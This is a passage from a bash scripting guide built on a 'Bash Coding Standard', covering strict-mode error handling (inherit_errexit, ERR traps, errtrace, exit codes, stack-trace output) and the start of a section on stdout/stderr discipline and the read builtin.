`shopt -s inherit_errexit` (bash 4.4+) propagates `errexit` into command
substitutions. Without it, every `$(...)` is a fresh subshell with
`set -e` *off*, regardless of the parent's setting. This is the
single most-confusion-causing default in bash strict mode, and the
reason a script with the textbook `set -e` line still silently
swallows errors.

### The bug magnet

`$(...)` runs its body in a subshell. By long-standing default, that
subshell's errexit state is reset to off, even when the parent has
`set -e`. The result: a command substitution that *contains* a
failing pipeline, sequence, or simple command runs to completion and
returns whatever the *last* command of the substitution produced. The
parent script sees only the resulting string and the substitution's
overall exit status (last command's status), and has no way to know
that an interior command failed.

This is why "I have `set -e` and my script still ignores errors!" is
the most-asked bash question on every Q&A site. The answer is almost
always: "the failure was inside `$(...)`."

### Before-and-after demo

```bash
# scenario: WRONG — without inherit_errexit, $() swallows interior failures
#!/usr/bin/env bash
set -euo pipefail                         # NOTE: no shopt -s inherit_errexit

result=$(grep nonexistent /etc/hostname; echo "fallback")
echo "result=[$result]"
# ⇒ result=[fallback]
# grep failed (rc=1), but the substitution kept running, ran echo,
# and the substitution's overall status is echo's status (0).
# Parent set -e never sees the grep failure.
```

```bash
# scenario: RIGHT — with inherit_errexit, $() exits on interior failure
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

result=$(grep nonexistent /etc/hostname; echo "fallback")
# ⇒ EXITS at the assignment line; the substitution's grep failed,
# the substitution-shell exits with grep's status (1), the parent
# sees rc=1 from $(...), and errexit fires on the assignment.
echo "unreached"
```

The two scripts differ only by the `shopt -s inherit_errexit` line.
The behavioural divergence is total: the first happily proceeds with a
nonsense value, the second halts loudly. BCS strict mode requires the
second.

### What `inherit_errexit` changes

The shopt enables `set -e` *inside* the subshell created for command
substitution. It does not affect:

- Explicit subshells `( ... )`. Those receive errexit by inheritance
  already in modern bash; the default was changed long before
  `inherit_errexit` was introduced.
- Pipeline component subshells. Each component runs in its own
  subshell; pipefail handles those, not `inherit_errexit`.
- Background `&` subshells. Those run independently; their status is
  observed via `wait`.
- Process substitutions `<(...)` / `>(...)`. Those run in subshells
  too, and have *no* status-propagation mechanism back to the parent.
  This is a known limitation of process substitution; see §11 (Process
  Substitution) for workarounds.

### Why it is not the default

Historical bash (pre-4.4) ran every command substitution with errexit
off because POSIX did not require otherwise and many scripts relied
on the leniency. Making `inherit_errexit` the default would break those
scripts. Bash therefore ships it as opt-in, with the BCS contract
(§13.9) opting in unconditionally. There is no scenario in
greenfield strict-mode bash where the default-off behaviour is
desirable.

### Idioms that need adjustment

A few patterns that worked under the old default are wrong under
`inherit_errexit`:

- `result=$(maybe_fail || echo "default")` — fine; the `||` provides
  the exemption (§13.3 row 1).
- `result=$(grep -c foo file)` where 0 matches is acceptable — needs
  `result=$(grep -c foo file || true)` because grep returns 1 on no
  match, and now propagates.
- `result=$(cmd 2>&1)` where `cmd` may legitimately fail and you want
  the diagnostic — same: append `|| true` (or capture rc explicitly:
  `if result=$(cmd 2>&1); then ...; else rc=$?; ...; fi`).

The general migration rule: any command substitution whose contents
may legitimately exit non-zero must say so with `|| true`, `||` plus a
fallback, or an explicit `if` capture.

### Interaction with traps

The ERR trap (§13.8) fires for the failure inside `$(...)` *if*
`errtrace` (`set -E`) is also set (§13.9). The EXIT trap fires for
the substitution-shell as it ends, but does not fire the parent's EXIT
trap — only the parent's own exit does that.

### Practical guidance

Treat `inherit_errexit` as load-bearing. Removing it from a strict-mode
contract reintroduces the canonical "silently ignored error" footgun.
The BCS contract (§13.9) makes it mandatory; every BCS template ships
with it.

**See also**: §13.2 (errexit semantics), §13.3 (exemption matrix row
7-8), §13.5 (pipefail), §13.8 (ERR trap), §13.9 (strict-mode
contract), §13.11 (propagation), BCS0101 (strict mode), BCS-bash
`30_45_shopt.md`.

## 13.7 `||:` and `|| true` idioms

Two equivalent idioms for "I expect this command may fail and I do
not want errexit to react":

| Form | Notes |
|------|-------|
| `cmd \|\| true` | explicit, readable; preferred in production scripts |
| `cmd \|\|:`     | compact (`:` is the null builtin, returning 0) |

Both produce a final exit status of 0 for the AND-OR list, satisfying
`set -e` (§13.2). Use after individual commands whose failure does
**not** indicate a script-level error — ad-hoc cleanup that may
discover an already-removed file, optional logging that may fail under
load, etc.

```bash
# scenario: tolerated failures
[[ -f $stale ]] && rm -- "$stale" || true   # OK if file is gone
notify_optional_endpoint || true            # OK if endpoint is down
```

The discrimination test: if the failure means the script should
*continue but log it*, write `if ! cmd; then warn '...'; fi`. If the
failure means the script should *fall back to a different action*,
write a proper `if`/`else`. If the failure means *do nothing different*
— no log, no fallback — then `|| true` is the right tool.

### AND-OR list precedence — the trap

This is the single biggest pitfall with `||:`. Bash's `&&` and `||`
have **equal precedence** and associate left-to-right. The idiom
`cmd_a && cmd_b || true` does **not** mean "`cmd_b` is protected by
`|| true`"; it means "(cmd_a && cmd_b) || true" — the `|| true`
protects the whole list, not the right-hand command alone.

```bash
# scenario: AND-OR precedence trap
set -euo pipefail

# What the author probably meant:
#   "always run cmd_a; if it succeeds, also run cmd_b; tolerate failure
#    of cmd_b but not cmd_a"
# What bash does:
#   "(cmd_a && cmd_b) || true" — failure of EITHER is suppressed.

cmd_a() { echo 'a ran'; return 1; }         # this should crash the script…
cmd_b() { echo 'b ran'; return 0; }
cmd_a && cmd_b || true                      # …but it doesn't!
echo 'we get here despite cmd_a failing'    # ⇒ we get here despite cmd_a failing
```

Two ways to disambiguate:

```bash
# scenario: explicit grouping — protect cmd_b only
cmd_a && { cmd_b || true; }                 # cmd_a still subject to set -e
# Or with an if:
if cmd_a; then
  cmd_b || true                             # cmd_b is the "tolerated" one
fi
```

Use the `{ … }` group when the whole expression must remain a single
list; use `if` when readability matters. The bare `cmd_a && cmd_b ||
true` form should be considered an anti-pattern in any script with
`set -e` active.

`:` is bash's null builtin (returns 0), `true` is also a builtin in
modern bash; they are functionally equivalent. Prefer `|| true` for
readability in code junior maintainers will read.

To proceed but keep the failure visible, capture and log instead of
swallowing: `cmd; rc=$?; (( rc )) && warn "cmd failed: rc=$rc"`. This
is more verbose but documents that the failure is known about, not
silently lost.

**See also**: §13.2 (`set -e` semantics), §13.3 (errexit exemption
matrix), §13.8 (ERR trap), §13.11 (propagating exit codes),
BCS-bash `30_43_set.md`, BCS0605 (error suppression), BCS0604
(checking return values).

## 13.8 The `ERR` trap

The `ERR` pseudo-signal fires whenever a command would cause `set -e`
to exit — i.e. whenever a non-zero exit status survives the exemption
matrix (§13.3). It is the canonical hook for diagnostic output before
the shell terminates.

```bash
on_err() {
  local rc=$? line=$1
  error "command failed at line $line with exit $rc: $BASH_COMMAND"
}
trap 'on_err $LINENO' ERR
```

The single-quoted handler text is mandatory: `$LINENO` must expand at
trap-fire time (when bash records the line of the failing command),
not at trap-installation time (when it would always read as the line
of the `trap` statement). See §12.5 for the broader single-vs-double
quote pitfall.

### Variables available inside the handler

| Variable | Meaning |
|----------|---------|
| `$?`              | the failing command's exit status |
| `$BASH_COMMAND`   | the literal text of the failing command |
| `$LINENO`         | line number of the failing command (must be passed positionally — see above) |
| `BASH_LINENO[]`   | call-site line numbers for each frame |
| `FUNCNAME[]`      | function names from current frame outwards (`[0]` is the trap itself) |
| `BASH_SOURCE[]`   | source files for each frame |

These together permit a full stack trace; see §13.12 for the
production-grade handler.

### Inheritance — the critical interaction with `set -E`

By default, an ERR trap is **not** inherited by functions, command
substitutions (`$(…)`), or subshells (`( … )`). The fix is `set -E`
(`errtrace`); with `errtrace` active, the ERR trap inherits into all
of the above. This is the same defect-and-fix as `inherit_errexit`
for `set -e`.

```bash
# scenario: ERR trap inheritance — default vs set -E
trap 'echo "ERR fired: $BASH_COMMAND"' ERR
inner() { false; }                         # would normally trigger ERR

inner                                      # ⇒ silent — ERR did NOT inherit
set -E                                     # turn on errtrace
inner                                      # ⇒ "ERR fired: false"
```

The strict-mode contract therefore adds `-E` whenever an ERR trap is
in use: `set -eEuo pipefail`. `set -T` (`functrace`) extends the same
inheritance to DEBUG and RETURN; BCS scripts with ERR almost always
want `set -eET` together (§13.9).

### When ERR does **not** fire

ERR honours the same exemptions as `set -e` (§13.3): left of `&&`/`||`,
condition of `if`/`while`/`until`, non-final pipeline component without
`pipefail`, inverted with `!`, or inside `$(…)` without
`inherit_errexit`. If none apply and ERR still misses, suspect missing
`set -E` (the inheritance bug above) or a later `trap … ERR` that
replaced yours.

The conventional pairing is one `ERR` for diagnostics and one `EXIT`
for cleanup. ERR runs first when the failing command's status would
trigger errexit; EXIT runs last and should `return "$rc"` to preserve
the failing exit status as the script's final status:

```bash
on_err()  { error "command failed (rc=$?) at $1: $BASH_COMMAND"; }
on_exit() { local rc=$?; cleanup_resources; return "$rc"; }
trap 'on_err $LINENO' ERR
trap on_exit EXIT
```

**See also**: §13.2 (`set -e` semantics), §13.3 (exemption matrix),
§13.9 (errtrace and trap inheritance), §13.12 (rich error output),
§12.5 (`trap` builtin), §12.6 (pseudo-signals), §12.8 (trap
inheritance), BCS0603 (trap handling), BCS-bash `30_43_set.md`,
BCS-bash `30_48_trap.md`.

## 13.9 `errtrace` and trap inheritance

`set -E` (equivalently `set -o errtrace`) propagates the `ERR` trap
into shell functions, command substitutions, and subshells. `set -T`
(`functrace`) does the same for `DEBUG` and `RETURN` traps. Without
these, traps installed at the top level are silently *not* in force
inside the structures where most of the work happens, and an ERR trap
that "covers the whole script" only covers its mainline.

### The canonical BCS strict-mode contract

Every BCS-compliant script begins with this preamble verbatim
(BCS0101):

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

Each flag earns its place:

- `set -e` (errexit, §13.2) — exit on unchecked non-zero status.
- `set -u` (nounset, §13.4) — error on unset variable references.
- `set -o pipefail` (§13.5) — pipeline status reflects rightmost
  non-zero component, not just the last.
- `shopt -s inherit_errexit` (§13.6) — propagate errexit into
  command substitutions; without this, `$(…)` swallows internal
  failures.
- `shopt -s shift_verbose` — `shift` errors loudly when the count
  exceeds available positionals, instead of silently doing nothing.
- `shopt -s extglob` — extended pattern matching: `@(a|b)`, `!(...)`,
  `?(...)`, `*(...)`, `+(...)`. Required for many BCS patterns
  (notably option bundling: `-[abc]?*`).
- `shopt -s nullglob` — unmatched globs expand to nothing rather than
  the literal pattern. `for f in /etc/cron.d/*` runs zero iterations
  when the directory is empty, instead of operating on the literal
  string `/etc/cron.d/*`.

Removing any single component reintroduces a documented hazard. The
contract is normative across all BCS scripts; libraries (BCS0407)
inherit it from the sourcing script and must not weaken it.

### Adding `set -E` for ERR-trap coverage

The strict-mode contract above does *not* include `set -E`. If the
script (or library) installs an ERR trap (§13.8) and expects it to
fire from within functions, command substitutions, or subshells,
add `errtrace` explicitly:

```bash
#!/usr/bin/env bash
set -eEuo pipefail                                      # note: -eE
shopt -s inherit_errexit shift_verbose extglob nullglob

trap 'rc=$?; printf >&2 "ERR rc=%d at %s:%d in %s\n" \
  "$rc" "${BASH_SOURCE[0]:-?}" "$LINENO" "${FUNCNAME[0]:-MAIN}"' ERR

work() {
  false                # ⇒ with set -E: trap FIRES from inside work()
}                      #    without -E: trap silent here
work
```

`set -eET -o pipefail` is the common longer form; `T` adds DEBUG /
RETURN trap inheritance for tracing libraries.

### What `errtrace` actually does

Bash maintains, per shell context (top level, function, subshell), a
table of installed traps. By default, when a function or subshell is
*entered*, the ERR trap is reset to its default (no action) for that
context. The ERR trap installed at the top level still applies to
top-level commands but not to commands run inside the function body.
`set -E` removes this reset: the ERR trap in force at function-entry
is propagated into the new context.

`set -T` (`functrace`) does the equivalent for DEBUG (fired before
each simple command) and RETURN (fired on function return / sourced-
script completion). Without `-T`, DEBUG and RETURN traps installed at
the top level are absent inside function bodies.

EXIT traps are special: they are *not* affected by `-E` or `-T`.
Each subshell can have its own EXIT trap, and an EXIT trap installed
at the top level fires only when the *top-level shell* exits.
Functions do not have their own EXIT trap; the EXIT trap installed
in the script fires once, when the script ends.

### Interaction with `inherit_errexit`

`inherit_errexit` (§13.6) and `errtrace` (§13.9) are independent. The
former determines whether `errexit` is *active* inside `$(…)`; the
latter determines whether the *ERR trap* fires when errexit triggers.
Neither implies the other. For full coverage — errors detected *and*
diagnosed everywhere — enable both.

```bash
# scenario: contract + ERR trap, end-to-end
#!/usr/bin/env bash
set -eEuo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

trap 'rc=$?; printf >&2 "ERR rc=%d cmd=[%s] at %s:%d\n" \
  "$rc" "$BASH_COMMAND" "${BASH_SOURCE[0]##*/}" "$LINENO"' ERR
trap 'rc=$?; (( rc )) && printf >&2 "EXIT rc=%d\n" "$rc"' EXIT

probe() { result=$(grep -c "$1" "$2"); echo "$result"; }

probe "alpha" /etc/hostname            # ⇒ if grep fails AND inherit_errexit
                                       #    is set AND errtrace is set,
                                       #    ERR fires inside probe(), then
                                       #    again in main; EXIT fires last.
```

### Practical guidance

The four-line preamble at the top of this chapter is mandatory in BCS
scripts. Add `set -E` (the `eE` shorthand) when ERR traps are part of
the script's diagnostic contract. Add `set -T` only when you actually
trace DEBUG/RETURN — it is a tracing tool, not a defensive setting.
Do not toggle these mid-script; the contract is a header, not a
runtime knob.

**See also**: §13.2 (errexit), §13.5 (pipefail), §13.6
(inherit_errexit), §13.8 (ERR trap), §12.6 (pseudo-signals), §12.8
(trap inheritance), BCS0101 (strict mode), BCS0110 (cleanup and
traps), BCS-bash `30_43_set.md`, BCS-bash `30_45_shopt.md`.

## 13.10 Exit code conventions

Standardised exit codes let callers (other scripts, supervisors, CI
systems) interpret a failure programmatically. Bash scripts mix several
conventions; choose one and document it. Consistency is more important
than which scheme is "right".

### Reserved by the shell and the kernel

| Code | Meaning |
|------|---------|
| `0`     | success |
| `1`     | generic error (catch-all) |
| `2`     | misuse of shell builtins / usage error (BSD convention) |
| `126`   | command found but not executable |
| `127`   | command not found |
| `128 + N` | killed by signal `N` (e.g. 130 = SIGINT, 143 = SIGTERM) |
| `255`   | wrap-around from `exit -1` (don't do this) |

Application codes should stay in `1`–`125` to avoid colliding with the
shell-reserved high range.

### `sysexits.h` (BSD)

The 64–113 range carries semantic meanings from `<sysexits.h>`:

| Code | Symbol | Meaning |
|------|--------|---------|
| 64 | `EX_USAGE`       | usage error |
| 65 | `EX_DATAERR`     | input data error |
| 66 | `EX_NOINPUT`     | missing input |
| 67 | `EX_NOUSER`      | unknown user |
| 68 | `EX_NOHOST`      | unknown host |
| 69 | `EX_UNAVAILABLE` | service unavailable |
| 70 | `EX_SOFTWARE`    | internal software error |
| 71 | `EX_OSERR`       | system error |
| 72 | `EX_OSFILE`      | system file error |
| 73 | `EX_CANTCREAT`   | cannot create output |
| 74 | `EX_IOERR`       | I/O error |
| 75 | `EX_TEMPFAIL`    | temporary failure (retryable) |
| 76 | `EX_PROTOCOL`    | protocol error |
| 77 | `EX_NOPERM`      | permission denied |
| 78 | `EX_CONFIG`      | configuration error |

This range is widely used by BSD-derived tools and `mailx`; less common
in shell scripts.

### BCS exit-code conventions

The Bash Coding Standard defines a compact subset focused on
shell-script needs (BCS0602). These overlap deliberately with the
shell-reserved codes (1, 2) and pick non-conflicting numbers
elsewhere:

| Code | Meaning |
|------|---------|
| 1  | generic error |
| 2  | usage error |
| 3  | file not found |
| 5  | I/O error |
| 13 | permission denied (`EACCES`) |
| 18 | missing dependency |
| 22 | invalid argument (`EINVAL`) |
| 24 | timeout (`ETIME`) |

```bash
# scenario: BCS-style die helpers with explicit codes
[[ -r $config ]] || die 3 "config not readable: $config"
command -v jq    >/dev/null || die 18 "missing dependency: jq"
[[ $verbose =~ ^[01]$ ]] || die 22 "verbose must be 0 or 1: '$verbose'"
```

For the canonical numeric→meaning table, including the `sysexits.h`
range, the shell-reserved codes, and the BCS subset side-by-side, see
**Appendix L (Exit Code Conventions)**. Cross-script callers should
read the appendix when defining a contract; script authors should pin
to one column and document it.

For a new BCS project, use the subset above and document the
project-specific extensions at the top of the script as a `# Exit
codes:` comment block. A downstream caller can then `case $rc` without
grepping source.

Three reminders: `kill -9` reports waited-status `137` (= 128 + 9)
and the EXIT trap does not run; `set -e` exits with the *failing
command's* status, not 1; `exit -1` becomes 255 and `exit 256`
becomes 0 (§13.1) — stay inside 1–125.

**See also**: §13.1 (exit status fundamentals), §13.2 (`set -e`
semantics), §13.11 (propagating exit codes), Appendix L (Exit Code
Conventions), Appendix K (Signal Numbers — Linux), BCS Section 6
(Error Handling), BCS0602 (exit codes), BCS-bash `23_EXIT-STATUS.md`.

## 13.11 Propagating exit codes

A function or pipeline must surface a meaningful exit code to its
caller. Bash's defaults — last command's status as the function's
status, last component's status as the pipeline's — are mostly right
but several patterns silently destroy the information. This chapter
covers the canonical capture-and-propagate forms, including the
`local x=$(failing)` error-eating gotcha that bites every bash author.

### Bash's exit-status conventions

Bash's own definition (BCS-bash `23_EXIT-STATUS.md`): a command's exit
status is an 8-bit integer (0-255). Zero means success; non-zero means
failure. Selected codes have customary meaning:

| Code | Meaning | Origin |
|------|---------|--------|
| 0 | Success | universal |
| 1 | General error | universal default |
| 2 | Usage error | BCS0602; some POSIX utilities |
| 3 | File not found | BCS0602 |
| 5 | I/O error | BCS0602 |
| 13 | Permission denied | BCS0602; mirrors `EACCES` |
| 18 | Missing dependency | BCS0602 |
| 22 | Invalid argument | BCS0602; mirrors `EINVAL` |
| 24 | Timeout | BCS0602 |
| 126 | Found but not executable | bash convention |
| 127 | Command not found | bash convention |
| 128+N | Killed by signal N | bash convention (e.g. 130 = SIGINT) |

Choose the closest match from BCS0602; reserve 1 for genuinely
"general" errors that do not fit a more specific code. Wrappers such
as `die 5 "io error: $path"` (BCS0703 messaging) use these directly.

### The `local x=$(failing)` error-eating gotcha

This is the canonical demo every bash author needs to see at least
once:

```bash
# scenario: WRONG — local masks the substitution's exit status
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

probe() {
  local -- result=$(grep -c nonexistent /etc/hostname)   # BUG
  # local's own exit status is 0 (the assignment succeeded).
  # The substitution's failure is invisible to errexit.
  echo "result=$result"
}
probe                                  # ⇒ "result=0" — keeps going!
```

`local x=$(cmd)` (or `declare`, `readonly`, `export` with an
assignment) is a *single command* whose exit status is the status of
the builtin (`local`/`declare`/etc.), not of the right-hand side.
`local` succeeds as long as the variable name is valid, so the
substitution's failure is silently absorbed. `inherit_errexit`
(§13.6) does not save you here, because the substitution *did* exit
with status 1 — but that status was overwritten by `local`'s own 0.

The fix is to *split* declaration from assignment:

```bash
# scenario: RIGHT — declare first, assign separately
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

probe() {
  local -- result                      # declare; rc=0 trivially
  result=$(grep -c nonexistent /etc/hostname)   # rc propagates; errexit fires
  echo "result=$result"                # ⇒ unreached
}
probe
echo "unreached"
```

After splitting, the assignment statement's exit status *is* the
substitution's exit status (with `inherit_errexit`), and errexit
catches it. This pattern (declare first, assign second) is BCS0201
canon for any command-substitution capture.

The same hazard applies to `readonly`, `export`, and `declare` with an
assignment. The same fix applies: declare alone, then assign.

### Capturing exit codes deliberately

When a non-zero status is *expected* and must be inspected, capture it
into a variable immediately. The capture must be the very next
statement — even an `[[ ]]` test will overwrite `$?`.

```bash
# scenario: capture rc immediately, branch on it
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

run_probe() {
  local -i rc=0
  some_probe --quiet || rc=$?          # || disables errexit; rc holds status
  case $rc in
    0)  return 0 ;;
    3)  warn "probe missing — continuing"; return 0 ;;
    24) die 24 "probe timed out" ;;
    *)  die 5 "probe failed: rc=$rc" ;;
  esac
}
```

`cmd || rc=$?` is the canonical form: it disables errexit for that
command (matrix row 1), captures the status, and lets the next
statement act on it. Followed by an explicit `case` or `if`, it gives
the caller full control while still surfacing a meaningful exit code.

### Pipelines

The pipeline's overall exit status is in `$?` immediately after the
pipeline; per-component statuses are in `PIPESTATUS[]` (§13.5).
`PIPESTATUS[]` is overwritten by the next pipeline (and by most other
commands). Snapshot first:

```bash
# scenario: pipeline rc + per-component rc — captured before clobber
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob
process() {
  local -i rc=0
  curl -sf "$1" | jq -e '.records[]' | head -50 || rc=$?
  local -ai rcs=("${PIPESTATUS[@]}")   # snapshot intact
  if (( rcs[0] )); then return 5; fi   # curl
  if (( rcs[1] )); then return 22; fi  # jq — invalid input
  return $rc
}
```

### Background jobs

For `cmd & pid=$!`, the background job's exit status is recovered with
`wait "$pid"`; the wait's return value is the job's status. Without
`wait`, the status is lost when the job's bookkeeping is reaped.
`wait -n` returns the next-completing job's status; `wait` (no args)
waits for all and returns the last's status. See §11 (concurrency).

### Functions and `return`

A function's implicit exit status is its last command's status. To
propagate explicitly, use `return $rc` after a capture, or arrange
the last command to be the one whose status you want surfaced.
`return` *requires* a non-negative integer 0-255; a string or negative
value triggers a syntax error (or, in some bash versions, silently
becomes 255).

The BCS template for functions that may fail:

```bash
do_thing() {
  local -- input="${1:?do_thing: input required}"
  local -i rc=0
  some_command --in "$input" || rc=$?
  if (( rc )); then
    error "some_command failed: rc=$rc"
    return $rc
  fi
  return 0
}
```

### Through `||` and `&&`

`cmd || cleanup; return $?` is a common bug: `cleanup`'s status
overwrites `cmd`'s. Capture first:

```bash
cmd || { rc=$?; cleanup; return $rc; }
```

Inside the `{ ... }` block, `cleanup`'s exit is irrelevant; only `rc`
matters. This is the canonical "rescue" idiom and the only correct
shape when cleanup has its own non-zero potential.

### Practical guidance

Three rules cover 95% of cases:

1. Never assign a command substitution on the same line as `local`,
   `declare`, `readonly`, or `export` (BCS0201).
2. Capture `$?` and `PIPESTATUS[]` immediately, before any other
   command runs.
3. Choose the exit code from BCS0602 that best describes the failure;
   reserve 1 for the residue.

**See also**: §13.2 (errexit), §13.5 (pipefail), §13.6
(inherit_errexit), §13.8 (ERR trap), §13.10 (exit-code conventions),
§13.12 (rich error output), §11 (concurrency / wait), BCS0201
(declarations), BCS0602 (exit codes), BCS0703 (messaging),
BCS-bash `23_EXIT-STATUS.md`.

## 13.12 Rich error output

Diagnostic output that carries enough context for an operator to
identify the failing command, the call stack, and any relevant process
state — without forcing them to re-run with `bash -x`.

### Stack-walking handler

The canonical pattern walks `FUNCNAME[]`, `BASH_SOURCE[]`, and
`BASH_LINENO[]` to print one frame per line, indented for readability:

```bash
bash_stack() {
  local i frame
  for ((i = 1; i < ${#FUNCNAME[@]}; i++)); do
    frame="${FUNCNAME[i]} (${BASH_SOURCE[i]}:${BASH_LINENO[i-1]})"
    printf '  at %s\n' "$frame" >&2
  done
}

on_err() {
  local rc=$? line=$1
  error "command failed (rc=$rc) at line $line: $BASH_COMMAND"
  bash_stack
}
trap 'on_err $LINENO' ERR
```

- `FUNCNAME[]`, `BASH_SOURCE[]`, `BASH_LINENO[]` are parallel arrays
  that together describe the call stack.
- Index 0 is the trap itself; useful frames start at 1.
- `BASH_LINENO[i-1]` is the line where frame `i` *called* frame `i-1`
  — the off-by-one is correct.
- All output goes to **stderr** (`>&2`) so callers can capture stdout
  cleanly (BCS0702).

### Formatted (icon-decorated) output

Combine BCS messaging icons (BCS0710 — `◉` info, `⦿` debug, `▲` warn,
`✓` success, `✗` error) with colour codes (BCS0706) for human-scannable
output. Wrap colour escapes in a `[[ -t 2 ]]` TTY check so non-tty
readers see plain text:

```bash
# scenario: formatted error output with icons + colour
if [[ -t 2 ]]; then RED=$'\033[31m' YEL=$'\033[33m' RST=$'\033[0m'
else                RED=''           YEL=''           RST=''
fi
error_pretty() {
  local rc=$? line=$1
  printf '%b ✗ command failed (rc=%d) at line %d\n' "$RED" "$rc" "$line" >&2
  printf '   %b%s%b\n'                         "$YEL" "$BASH_COMMAND" "$RST" >&2
  bash_stack
}
trap 'error_pretty $LINENO' ERR
```

### JSON-mode variant for machine consumption

Long-running daemons, CI pipelines, and supervisors increasingly want
structured error output. The same handler can emit a JSON object on a
single line — easily ingested by `jq`, log aggregators, or test
runners:

```bash
# scenario: structured JSON error output
on_err_json() {
  local rc=$? line=$1
  local -a frames=()
  local i
  for ((i = 1; i < ${#FUNCNAME[@]}; i++)); do
    frames+=( "$(printf '{"func":%q,"source":%q,"line":%d}' \
                  "${FUNCNAME[i]}" "${BASH_SOURCE[i]}" "${BASH_LINENO[i-1]}")" )
  done
  local frames_json
  printf -v frames_json '%s,' "${frames[@]}"
  frames_json="[${frames_json%,}]"

  printf '{"level":"error","rc":%d,"line":%d,"command":%q,"stack":%s}\n' \
    "$rc" "$line" "$BASH_COMMAND" "$frames_json" >&2
}
trap 'on_err_json $LINENO' ERR
```

The output is one JSON object per line — `ndjson` — so a downstream
consumer can `jq -c .` over the stderr stream without buffering. Switch
between text and JSON modes via a flag (`--json` or `BCS_JSON_MODE=1`),
mirroring the BCS-CLI convention used by `bcs check -j`.

```bash
if [[ ${OUTPUT_FORMAT:-text} == json ]]; then
  trap 'on_err_json $LINENO' ERR
else
  trap 'error_pretty  $LINENO' ERR
fi
```

### What to include

A useful error report covers: exit status (`$?`); failing command
text (`$BASH_COMMAND`); source location (`$LINENO`, `BASH_SOURCE`);
call stack (`FUNCNAME[]`/`BASH_LINENO[]`); and — when the script forks
or the diagnostic crosses a pipeline — process identity (`$$`,
`$BASHPID`, `$PPID`). A consistent text format is greppable; the
JSON form is parseable. Pick one shape per script and stick to it.

**See also**: §13.1 (exit status fundamentals), §13.2 (`set -e`
semantics), §13.8 (ERR trap), §13.9 (errtrace and trap inheritance),
§13.10 (exit code conventions), §14.7 (logging discipline), BCS0602
(exit codes), BCS0701 (message control flags), BCS0702 (stdout vs
stderr separation), BCS0703 (core messaging system), BCS0706 (color
definitions), BCS0710 (standard icons), BCS0603 (trap handling).

# Part XIV — Input, Output, and Messaging

*Bash's I/O builtins (`read`, `printf`, `mapfile`) and the disciplines around them. The cardinal rule: stdout is data, stderr is diagnostics; never mix them.*

---

---

## 14.1 Standard streams discipline

The convention that distinguishes a composable script from a broken one:
**stdout carries data, stderr carries diagnostics.** A script that follows
this rule slots cleanly into a pipeline; one that does not corrupts every
downstream consumer.

### The two channels

- **stdout (fd 1)** — the script's *data output*, the payload a downstream
  pipe consumes. If the script has no data to emit, stdout stays empty
  and exit status communicates success or failure.
- **stderr (fd 2)** — *diagnostics*: info, warn, error, debug, progress
  bars, prompts. Anything a human reads but a pipe should not.

A script may legitimately produce no stdout at all. A script must
**never** emit diagnostics to stdout when stdout is being captured or
piped — the consumer cannot distinguish data from chatter.

### The anti-pattern

```bash
# wrong — script counts matching files but chats on stdout
#!/bin/bash
set -euo pipefail
count_matches() {
  echo "Scanning..."                # ← diagnostic on stdout (wrong)
  local -i n=0
  for f in *.txt; do ((n+=1)); done
  echo "$n"
}
count_matches
```

Piped into `wc -l`, the caller sees `2` lines (`Scanning...` plus the
count) instead of the single number it expected. The first downstream
arithmetic operation produces nonsense:

```text
$ count_matches | wc -l
2                   # ⇒ should be 1; the diagnostic line was counted
$ total=$(count_matches); echo "$((total + 1))"
bash: Scanning...
12 + 1: syntax error in expression
```

### The correct pattern

Send every diagnostic to fd 2 explicitly. The BCS messaging helpers
(`info`, `warn`, `error`, `die`) do this for you (BCS0703); for ad-hoc
diagnostics, redirect with `>&2`.

```bash
# right — same script, diagnostics on stderr
count_matches() {
  printf 'Scanning...\n' >&2       # diagnostic on stderr (correct)
  local -i n=0
  for f in *.txt; do ((n+=1)); done
  printf '%d\n' "$n"               # data on stdout
}
```

```text
$ count_matches | wc -l
Scanning...
1                   # ⇒ correct: stderr passed through to terminal,
                    #   stdout had exactly one line for wc
```

### Rules of thumb

- Never write diagnostics with bare `echo` or `printf` — always `>&2`,
  or use a messaging helper that does it for you.
- Prompts (`read -p`) write to stderr automatically — safe inside
  pipelines.
- Progress bars and spinners go to stderr; they are diagnostics, not
  data.
- A script that *only* produces side-effects (deploys, syncs, installs)
  may emit progress to stdout under `--verbose`, but its default mode
  should be silent on stdout so it composes with `&&`/`||` chains.
- When in doubt, ask: *would I want this line captured by a downstream
  `read -r line`?* If no, it belongs on stderr.

### Exit status is part of the contract

stdout and stderr describe *what* the script did; exit status describes
*whether it succeeded*. A pipeline-friendly script returns:

- `0` — success, any stdout is valid data
- non-zero — failure; stdout content (if any) is undefined and should
  not be consumed

Combined with `set -o pipefail` (assumed under strict mode), this lets
callers detect failure even when the failing stage is upstream of the
last command in a pipeline.

### See also

- §14.7 — logging discipline (always to stderr)
- §14.10 — progress indicators (stderr destination)
- §14.12 — concurrent writes and `PIPE_BUF`
- BCS0703 (messaging system), BCS0701 (script structure)

## 14.2 The `read` builtin

Read input from stdin (or a specified fd) into one or more variables.
The default behaviour interprets backslash escapes and field-splits on
`IFS`; both behaviours bite scripts and both are easily disabled.

### Flag reference

- `read var` — single variable; field-splits on `IFS`.
- `read var1 var2 var3` — multiple; the last variable receives every
  remaining field (joined with the first character of `IFS`).
- `read -r` — *raw* mode; do not interpret backslash escapes (almost
  always wanted; BCS treats bare `read` as a defect).
- `read -d DELIM` — read until DELIM character instead of newline.
- `read -d ''` — read until NUL; pairs with `find -print0` and
  `mapfile -d ''`.
- `read -p PROMPT` — interactive prompt to stderr (safe in pipelines).
- `read -t TIMEOUT` — timeout in seconds (fractional in Bash 4.0+);
  exits 142 (or `128 + SIGALRM`) on timeout.
- `read -n N` — read at most N characters.
- `read -N N` — read exactly N characters; ignores delimiters.
- `read -u FD` — read from a specific fd (avoids redirection scope
  surprises in subshells).
- `read -e` / `read -i TEXT` — readline-edited input with optional
  pre-fill (interactive only).
- `read -s` — silent (no echo, password prompts).
- `read -a arr` — read into an indexed array, splitting on `IFS`.

### `IFS` interaction

Without `IFS=` in front of `read`, leading and trailing whitespace are
stripped and runs of whitespace collapse. The canonical "preserve every
byte" form is:

